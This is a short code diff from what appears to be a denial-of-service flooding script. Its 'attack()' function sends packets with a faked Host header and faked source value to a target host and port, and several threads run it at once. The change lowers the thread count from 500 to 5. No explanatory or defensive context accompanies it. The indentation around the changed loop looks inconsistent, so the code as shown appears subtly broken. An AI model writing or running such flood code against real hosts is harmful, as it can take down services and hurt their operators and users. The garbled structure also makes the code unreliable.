@@ -13,7 +13,7 @@ def attack():
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
         s.close()
         
-       for i in range(500):
+       for i in range(5):
     thread = threading.Thread(target=attack)
     thread.start()
     
